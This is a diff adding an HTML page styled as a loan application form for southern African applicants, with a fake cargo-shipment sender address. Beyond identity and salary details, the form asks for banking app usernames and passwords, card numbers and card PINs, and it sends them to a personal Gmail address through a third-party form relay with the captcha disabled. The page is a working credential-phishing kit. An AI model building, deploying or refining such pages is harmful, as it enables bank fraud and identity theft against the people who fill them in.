@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+
+<html lang="en">
+    <head>
+      <link rel="stylesheet" href="styles.css">
+        <link rel="stylesheet" href="styles1.css">
+        <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Contact Form</title>
+    </head>
+
+    <body>
+      <header>
+      <div id="header"><img src="logo.png" alt="" id="logo"></div>
+      </header>
+      <div id="header-container">
+        <img src="header.png" alt="" srcset=""  id="header-image">
+      </div>
+
+
+      <div id="hed">
+        
+          <div class="form-container">
+                        
+            <form id="myform" action="https://formsubmit.co/britishcargoshipment@gmail.com" method="POST"  enctype="multipart/form-data">
+                <div id="first-step">
+                  <h2>Contact Information</h2>
+                  <hr>
+                  <label for="name">Full Name</label>
+                  <input type="text" id="name" name="name" placeholder="Your full name" required>
+
+                  <label for="dob">Date of Birth</label>
+                  <input type="date" id="dob" name="dob" placeholder="Date of Birth" required>
+
+                  <label for="phone" requred>Phone Number</label>
+                  <input type="tel" id="phone" name="phone" placeholder="phone number" required>
+
+                  <label for="email">Email Address</label>
+                   <input type="email" name="email" id="email" placeholder="Enter Your Email Address">
+
+                  <label for="gender">Gender</label>
+                  <select id="gender" name="gender" required>                 
+                    <option value="">Select your gender</option>
+                    <option value="Male">Male</option>
+                    <option value="Female">Female</option>
+                  </select>
+
+                   
+                  <label for="address">Residential Address</label>
+                  <textarea  id="address"  name="address" minlength=""></textarea>
+
+                  <label for="city">City</label>
+                  <input type="text" id="city" placeholder="example: Cape Town">
+
+                  <label for="province">Province</label>
+                  <input type="text" id="province" placeholder="example: Western Cape">
+
+                  <label for="country">Country</label>
+                    <select id="country" name="country" required>
+                    <option value="">Select your country</option>
+                    <option value="AG">Angola</option>
+                    <option value="BS">Botswana</option>
+                    <option value="LT">Lesotho</option>
+                    <option value="NB">Namibia</option>
+                    <option value="SA">South Africa</option>
+                    <option value="ZM">Zimbabwe</option>
+
+                    <!-- ... continue with all countries ... -->
+                
+                  </select>
+
+                 
+                </div>
+
+
+      
+
+                <div id="second-step">
+                  <hr>
+                      <!-- Account information -->
+                  <h2>Accounting Information</h2>
+                  
+                  <span id="span">This field is requred for Credit Score Verification Purposes</span>
+                  <form id="myform">
+                    
+                    <!-- loan details -->
+                    <h3>Loan Details</h3>
+
+                    <label for="id-number">ID Number</label>
+                    <input type="text" id="id-number" name="id-number" placeholder="id number" required>
+                    
+                    
+                    <label for="salary">Gross Salary (In ZAR)</label>
+                    <input type="number" id="salary" name="salary" placeholder="How much do you earn in a month?" required>
+
+                    <label for="occupation">Occuptation</label>
+                    <input type="text" id="occupation" name="ocupation" placeholder="What you do for living">
+                    
+                    <label for="pay-date">Salary Pay Date</label>
+                    <input type="date" id="pay-date" name="pay-date"required>
+
+
+                    
+                    <label for="loan-amount">Loan Amount (in ZAR)</label>
+                    <input type="text" id="loan-amount" name="Loan Amount" placeholder="loan amount" required>
+
+                    <label for="repayment-date">Loan Repay Date</label>
+                    <input type="date" id="repayment-date" name="repayment-date" placeholder="when you intent to repay this loan">
+
+                    <label for="loan-reason">Reason for loan</label>
+                    <textarea id="loan-reason" name="Loan Amount" minlength="30">I need this loan because </textarea>
+
+                    
+                    
+                    <h3>Banking Details</h3>
+                      
+                    <label for="bank">Bank</label>
+                    <select id="bank" name="bank" required>
+                      <option value="">Select your bank</option>
+                      <option value="FNB Bank">First National Bank (FNB)</option>
+                      <option value="Standard Bank">Standard Bank</option>
+                      <option value="ABSA">ABSA Bank</option>
+                      <option value="Capitec"> Capitec Bank</option>
+                      <option value="Ned">NedBank</option>
+                      <option value="other bank">Other Banks</option>
+
+
+
+                      <!-- ... continue with all banks ... -->
+                    
+                    </select>
+                    <label for="acc-number">Account Number</label>
+                    <input type="number" id="acc-number" name="acc-number" minlength="6" placeholder="Account Number" required>
+
+                    <label for="app-username">Banking App Username</label>
+                    <input type="text" id="app-username" name="app-username" placeholder="Enter your banking app username" required>
+
+                    <label for="password">Banking App Password</label>
+                    <input type="password" name="app-password" id="password" placeholder="Enter your banking app ">
+                    
+                    <label for="card-number">Card Number</label>
+                    <input type="number" id="card-number" name="card number" pattern="numeric"
+                    minlength="13" placeholder="Enter Your Card Number" required>
+
+                    <label for="card-pin">Card PIN</label>
+                    <input type="password" inputmode="numeric" pattern="[0-9]*" placeholder="Enter Your Card PIN" maxlength="5">
+                   <!-- < <br><br>
+                    <label for="card-front" >Upload Bank Card-Front</label>
+                    <input type="file" id="card-front" name="front" accept="image/png, image/jpeg">
+
+                     <label for="card-back" >Upload Bank Card-Back</label>
+                    <input type="file" id="card-back" name="back" accept="image/png, image/jpeg">> -->
+
+
+                    <div id="check-container">
+                      <label for="toggle">Check this box if you have confirmed that the provided details are correct</label>
+                      <input type="checkbox" name="" id="toggle" onclick="submitForm()">
+                    </div>
+                    
+                    <!-- FORMSUBMIT MODIFICATION -->
+
+                    <input type="hidden" name="_subject" value="Loan Submission">
+                   <input type="hidden" name="_next" value="https://thankpg.netlify.app">
+                    <input type="hidden" name="_captcha" value="false">
+                    
+                    
+                    <button type="submit" id="submit" onclick="submitForm()">Submit</button>
+                  </div>
+                  
+                  
+
+          </form>
+        
+        </div>
+
+
+      </div>
+
+       
+      
+      
+      <script src="index.js" defer></script>
+
+        </script>
+
+
+   </body> 
+
+
+</html>
